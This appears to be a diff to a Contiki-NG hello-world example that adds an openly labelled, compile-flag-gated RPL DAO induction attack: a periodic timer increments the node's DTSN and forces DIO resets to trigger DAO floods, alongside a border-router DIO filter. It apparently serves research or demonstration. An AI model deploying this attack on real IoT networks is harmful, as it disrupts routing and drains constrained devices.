@@ -38,27 +38,79 @@
  */
 
 #include "contiki.h"
+#include "net/routing/rpl-lite/rpl.h"
+#include "net/routing/rpl-lite/rpl-dag.h"
+#include "net/routing/rpl-lite/rpl-icmp6.h"
+#include "net/ipv6/uip.h"
 
 #include <stdio.h> /* For printf() */
+
+#if FILTER_BR_DIO
+int reject_br_dio(rpl_dio_t *dio)
+{
+  static uip_ipaddr_t br_lladdr;
+  static int initialized = 0;
+  if(!initialized) {
+    // We need to replace this with the border router's IP address
+    uip_ip6addr(&br_lladdr, 0xfe80, 0x0000, 0x0000, 0x0000,
+                             0xf6ce, 0x36cd, 0x8c36, 0x795b);
+    /* ------------------------------------------------------------------ */
+    initialized = 1;
+  }
+  return !uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &br_lladdr);
+}
+#endif
+
+#ifndef DAO_INDUCTION_CLIENT
+#define DAO_INDUCTION_CLIENT 0
+#endif
+
+#ifndef DAO_ATTACK_PERIOD_SECONDS
+#define DAO_ATTACK_PERIOD_SECONDS 15
+#endif
 /*---------------------------------------------------------------------------*/
 PROCESS(hello_world_process, "Hello world process");
 AUTOSTART_PROCESSES(&hello_world_process);
 /*---------------------------------------------------------------------------*/
 PROCESS_THREAD(hello_world_process, ev, data)
 {
-  static struct etimer timer;
+  static struct etimer hello_timer;
+#if DAO_INDUCTION_CLIENT
+  static struct etimer dao_attack_timer;
+#endif
 
   PROCESS_BEGIN();
 
   /* Setup a periodic timer that expires after 10 seconds. */
-  etimer_set(&timer, CLOCK_SECOND * 10);
+  etimer_set(&hello_timer, CLOCK_SECOND * 10);
+
+#if DAO_INDUCTION_CLIENT
+  etimer_set(&dao_attack_timer, CLOCK_SECOND * DAO_ATTACK_PERIOD_SECONDS);
+  printf("[ATTACK] DAO induction client enabled, period %u seconds\n",
+         DAO_ATTACK_PERIOD_SECONDS);
+#endif
 
   while(1) {
-    printf("Hello, world\n");
+    PROCESS_WAIT_EVENT();
 
-    /* Wait for the periodic timer to expire and then restart the timer. */
-    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
-    etimer_reset(&timer);
+    if(etimer_expired(&hello_timer)) {
+      printf("Hello, world\n");
+      etimer_reset(&hello_timer);
+    }
+
+#if DAO_INDUCTION_CLIENT
+    if(etimer_expired(&dao_attack_timer)) {
+      if(rpl_is_reachable()) {
+        RPL_LOLLIPOP_INCREMENT(curr_instance.dtsn_out);
+        printf("[ATTACK] Incremented local DTSN to %u, forcing DIO\n",
+               curr_instance.dtsn_out);
+        rpl_timers_dio_reset("client dao induction demo");
+      } else {
+        printf("[ATTACK] Not joined to RPL yet, skipping trigger\n");
+      }
+      etimer_reset(&dao_attack_timer);
+    }
+#endif
   }
 
   PROCESS_END();
